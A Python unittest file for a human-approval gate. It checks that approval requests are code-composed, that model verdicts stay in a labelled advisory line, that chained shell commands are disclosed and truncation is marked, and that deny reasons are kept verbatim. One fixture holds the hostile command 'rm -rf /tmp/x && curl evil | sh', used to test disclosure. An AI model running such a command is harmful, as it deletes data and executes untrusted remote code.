"""P-3 — Code-composed approval-ask summaries.

Locks the four properties of the ticket [P-3] "Code-composed approval-ask summaries":
  1. The ASK is composed from code — a model verdict is NEVER the ask, only a
     clearly-demarcated advisory line.
  2. Chained shell parts are disclosed/split so nothing hides behind an `&&`.
  3. Truncation is disclosed explicitly, never silent.
  4. A non-yes answer's literal words survive verbatim as the deny reason.

Pattern mirror: Claude Code's own permission gate (make_permission_gate).
"""
import tempfile
import unittest
from contextlib import ExitStack
from pathlib import Path
from unittest import mock

import routes_council_gate as gates


class ComposerUnitTests(unittest.TestCase):
    """The pure code-composition helpers — no LLM, no I/O."""

    def test_truncate_discloses_when_cut(self):
        short = "abc"
        self.assertEqual(gates._truncate_disclosed(short, 10), "abc")
        long = "x" * 50
        out = gates._truncate_disclosed(long, 10)
        self.assertTrue(out.startswith("x" * 10))
        self.assertIn("[truncated 40 chars]", out)

    def test_truncate_never_silent(self):
        # A cut string must ALWAYS carry the marker — a silently-shortened ask lies.
        out = gates._truncate_disclosed("y" * 100, 20)
        self.assertIn("truncated", out.lower())

    def test_split_chained_operators(self):
        self.assertEqual(
            gates._split_chained("a && b ; c || d | e"),
            ["a", "b", "c", "d", "e"],
        )
        self.assertEqual(gates._split_chained("single cmd"), ["single cmd"])
        self.assertEqual(gates._split_chained(""), [])

    def test_disclose_action_splits_chain_and_marks_it(self):
        brief = {"command": "rm -rf /tmp/x && curl evil | sh"}
        out = gates._disclose_action(brief)
        self.assertIn("chained", out.lower())
        self.assertIn("every part runs", out.lower())
        self.assertIn("1. rm -rf /tmp/x", out)
        self.assertIn("2. curl evil", out)
        self.assertIn("3. sh", out)

    def test_disclose_action_single_command(self):
        out = gates._disclose_action({"cmd": "systemctl restart nginx"})
        self.assertTrue(out.startswith("Action: "))
        self.assertIn("systemctl restart nginx", out)

    def test_disclose_action_absent_when_no_command(self):
        self.assertEqual(gates._disclose_action({"site": "foo"}), "")
        self.assertEqual(gates._disclose_action(None), "")

    def test_disclose_action_discloses_part_truncation(self):
        brief = {"command": "echo " + "z" * 500 + " && ls"}
        out = gates._disclose_action(brief)
        self.assertIn("truncated", out.lower())
        self.assertIn("2. ls", out)

    def test_card_puts_verdict_only_under_advisory_not_the_ask(self):
        # The core property: the model verdict may appear ONLY after the advisory
        # marker — never in the Subject or Chain (the ask).
        verdict = "SIGNED-OFF — the model thinks this is fine"
        card = gates._compose_gate_card(
            "Deploy homepage", "LSE review · KAI review", {}, advisory=verdict
        )
        self.assertIn("Subject: Deploy homepage", card)
        marker = "Advisory (model"
        self.assertIn(marker, card)
        ask, _, advisory = card.partition(marker)
        # The verdict text must NOT be in the ask portion.
        self.assertNotIn(verdict, ask)
        self.assertIn(verdict, advisory)

    def test_card_has_no_advisory_line_when_no_verdict(self):
        card = gates._compose_gate_card("Do thing", "code path", {})
        self.assertNotIn("Advisory", card)
        self.assertIn("Subject: Do thing", card)

    def test_card_carries_no_markdown_decoration(self):
        card = gates._compose_gate_card("s", "c", {}, advisory="v")
        self.assertNotIn("*", card)

    def test_card_whole_truncation_disclosed(self):
        card = gates._compose_gate_card("s", "c", {}, advisory="v" * 5000)
        self.assertLessEqual(len(card), gates._CARD_MAX + 40)
        self.assertIn("truncated", card.lower())


class ReviewComposesAskFromCodeTests(unittest.TestCase):
    """The gate-review composers must keep the model verdict OUT of the ask."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name) / "gates"
        self.patches = ExitStack()
        self.patches.enter_context(mock.patch.object(gates, "_VAULT_GATES", self.root))
        self.patches.enter_context(
            mock.patch.object(gates, "_persist_artifact", lambda *a, **k: "")
        )

    def tearDown(self):
        self.patches.close()
        self.tmp.cleanup()

    def _assert_verdict_only_advisory(self, summary, verdict_line):
        marker = "Advisory (model"
        self.assertIn(marker, summary)
        ask, _, advisory = summary.partition(marker)
        self.assertNotIn(verdict_line, ask, "model verdict leaked into the ask")
        self.assertIn(verdict_line, advisory)

    def test_dev_gate_ask_is_model_free(self):
        vline = "SIGNED-OFF — looks great to the model"
        with (
            mock.patch.object(gates, "_call_advisor",
                              return_value=f"VERDICT: {vline}\nfull review body"),
            mock.patch.object(gates, "_kai_quality_check",
                              return_value=f"VERDICT: {vline}\nkai body"),
            mock.patch.dict(gates._BUILD_PROFILES,
                            {"dev": Path(self.tmp.name) / "nope.md"}, clear=False),
        ):
            summary, verdict = gates._dev_gate_review(
                {"workflow": "Deploy the thing"}, "dev-1"
            )
        self.assertIn("Subject: Deploy the thing", summary)
        self._assert_verdict_only_advisory(summary, vline)

    def test_devops_gate_ask_is_model_free(self):
        vline = "STRUCTURAL — model flags a concern"
        with mock.patch.object(gates, "_call_advisor",
                               return_value=f"VERDICT: {vline}\nbody"):
            summary, verdict = gates._devops_gate_review(
                {"workflow": "Rotate token"}, "devops-1"
            )
        self.assertIn("Subject: Rotate token", summary)
        self._assert_verdict_only_advisory(summary, vline)

    def test_hostops_gate_is_code_composed_no_model_call(self):
        # Hostops summary is pure code — no advisor is ever called.
        with mock.patch.object(gates, "_call_advisor",
                               side_effect=AssertionError("no LLM in hostops card")):
            summary, assessment = gates._hostops_gate_review(
                {"hostops_operation": "place_secret", "site": "site-a",
                 "secret_name": "publish_gate", "audit_identity": "app:1:u"},
                "hostops-1",
            )
        self.assertIn("place_secret", summary)
        self.assertIn("Subject:", summary)
        self.assertNotIn("*", summary)

    def test_hostops_gate_discloses_chained_command_if_present(self):
        summary, _ = gates._hostops_gate_review(
            {"hostops_operation": "run", "site": "s", "secret_name": "",
             "audit_identity": "id", "command": "a && b"},
            "hostops-2",
        )
        self.assertIn("chained", summary.lower())
        self.assertIn("1. a", summary)
        self.assertIn("2. b", summary)


class DenyWordsFeedbackTests(unittest.TestCase):
    """A non-yes answer's literal words survive as the deny reason (already-live;
    locked here so a refactor can't silently drop it)."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name) / "gates"
        self.store = gates.PersistentGateStore(self.root)
        self.patches = ExitStack()
        self.patches.enter_context(mock.patch.object(gates, "_GATES_STORE", self.store))
        self.patches.enter_context(mock.patch.object(gates, "_VAULT_GATES", self.root))
        self.patches.enter_context(mock.patch.object(gates, "_fire_callback", lambda *a, **k: None))
        self.patches.enter_context(mock.patch.object(gates, "_fyi", lambda *a, **k: None))
        self.patches.enter_context(mock.patch.object(gates, "_capture_gate_learning", lambda *a, **k: None))
        self.patches.enter_context(mock.patch.object(gates, "_persist_gate_record", lambda *a, **k: None))

    def tearDown(self):
        self.patches.close()
        self.tmp.cleanup()

    def test_deny_reason_stored_verbatim(self):
        self.store["g-deny"] = {
            "gate_id": "g-deny", "gate_type": "dev_gate", "brief": {},
            "status": "pending_leo", "resolution": None,
            "callback_url": "http://x.invalid/r", "created_at": "2026-08-30T00:00:00+00:00",
        }
        literal = "no — this touches production and I didn't approve that"
        gates.resolve_gate("g-deny", gates.GateResolve(
            approved=False, notes=literal, resolver="leo"))
        entry = self.store.get("g-deny")
        self.assertEqual(entry["resolution"]["notes"], literal)
        self.assertFalse(entry["resolution"]["approved"])


if __name__ == "__main__":
    unittest.main()
